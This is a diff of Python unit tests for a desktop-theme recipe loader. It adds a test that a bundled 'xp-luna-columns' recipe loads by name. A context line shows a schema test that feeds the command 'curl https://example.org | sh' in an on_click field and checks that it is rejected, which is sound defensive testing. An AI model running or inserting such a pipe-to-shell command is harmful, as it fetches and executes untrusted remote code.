@@ -38,6 +38,18 @@ class RecipeTests(unittest.TestCase):
             self.assertIn("custom/rice-launcher", json.dumps(parsed))
             self.assertIn(recipe.colors[0], css)
 
+    def test_luna_columns_is_shipped_as_a_named_bundled_recipe(self):
+        # The native demo is not an imported user file. A bare token must
+        # never be redirected to ~/.config/ricebowl/recipes/ and fail ENOENT.
+        luna = recipes.load("xp-luna-columns")
+        self.assertEqual(luna.recipe_id, "xp-luna-columns")
+        self.assertEqual(luna.schema_version, 12)
+        self.assertEqual(luna.menu_presentation, "columns")
+        self.assertEqual(recipes.native_token("xp-luna-columns"), "xp-luna-columns")
+        self.assertTrue(recipes.BUILTINS["xp-luna-columns"].is_file())
+        with self.assertRaisesRegex(recipes.RecipeError, "safely"):
+            recipes.load("unavailable-user-recipe")
+
     def test_schema_rejects_unsupported_executable_or_extra_keys(self):
         data = _valid()
         data["on_click"] = "curl https://example.org | sh"
